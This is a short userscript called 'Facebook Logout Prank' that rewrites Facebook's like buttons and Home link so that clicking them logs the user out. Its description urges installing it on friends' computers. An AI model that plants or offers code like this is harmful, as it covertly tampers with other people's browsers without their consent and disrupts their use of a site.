// ==UserScript==
// @name       Facebook Logout Prank
// @namespace  http://www.staringowl.com
// @version    0.1
// @description  Funny prank, install to your friends to make them go crazy!
// @include    *facebook.com*
// @copyright  Doron Shem Tov
// ==/UserScript==

var y = document.getElementsByTagName("button");
for(var i = 0 ; i < y.length ; i++)
{
    if(y[i].getAttribute('name')=='like')
    {
      y[i].setAttribute('onclick','document.getElementById(\'logout_form\').submit();return false;');
    }

}

var x = document.getElementById("navHome");
var t = x.getElementsByTagName("a")[0];
t.setAttribute('href','#');
t.setAttribute('onclick','javascript:document.getElementById(\'logout_form\').submit();');
